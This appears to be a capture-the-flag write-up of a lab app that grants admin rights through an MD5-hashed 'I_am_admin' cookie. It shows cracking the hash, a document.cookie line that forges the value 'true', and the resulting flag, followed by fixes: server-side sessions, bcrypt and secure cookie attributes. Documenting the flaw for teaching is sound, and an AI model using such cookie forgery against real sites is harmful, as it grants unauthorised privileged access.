# Cookie Weak Encryption Vulnerability

## 🎯 Overview
This vulnerability demonstrates weak cookie encryption using MD5 hashing for authentication control. The application uses a predictable cookie value to determine admin privileges, making it susceptible to manipulation.

## 🔍 Vulnerability Details
- Cookie Name: `I_am_admin`
- Original Hash: `68934a3e9455fa72420237eb05902327`
- Decrypted Value: `false`
- Exploited Hash: `b326b5062b2f0e69046810717534cb09` (MD5 of "true")

## ⚔️ Exploitation Process

### 1. Cookie Analysis
```javascript
// Original cookie value
document.cookie
// "I_am_admin=68934a3e9455fa72420237eb05902327"
```

### 2. Hash Decryption
- Tool Used: [MD5decrypt.net](https://md5decrypt.net)
- Input Hash: `68934a3e9455fa72420237eb05902327`
- Decrypted Value: `false`

### 3. Exploitation Steps
1. Generate MD5 hash of "true"
2. Replace cookie value with new hash
3. Reload the page

```javascript
// Set manipulated cookie
document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"
```

### Attack Result
**Flag**: df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

## 🛡️ Security Issues Identified
1. Weak hashing algorithm (MD5)
2. Predictable cookie values
3. Client-side authentication control
4. No server-side validation
5. Lack of secure session management

## 🔒 Recommended Security Fixes

### 1. Implement Secure Session Management
```python
# Example using secure session management
from flask import session
import secrets

def create_secure_session():
    session['session_id'] = secrets.token_hex(32)
    session['user_role'] = 'user'
    session.permanent = True
```

### 2. Use Strong Hashing Algorithms
```python
# Example using bcrypt
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt)
```

### 3. Security Measures Checklist
- [ ] Implement proper session management
- [ ] Use secure hashing algorithms (bcrypt/Argon2)
- [ ] Set secure cookie attributes
- [ ] Implement server-side validation
- [ ] Use HTTPS for all connections
- [ ] Implement proper authentication flow

### 4. Secure Cookie Configuration
```python
# Example secure cookie settings
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30)
)
```

## 📝 Best Practices for Cookie Security

### Cookie Attributes
```http
Set-Cookie: session=123456; 
    Secure; 
    HttpOnly; 
    SameSite=Strict; 
    Path=/; 
    Domain=example.com
```

### Session Management
- Use server-side sessions
- Implement session timeout
- Rotate session IDs
- Validate session data
- Implement proper logout

## 📚 Additional Resources
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Secure Cookie Attributes](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.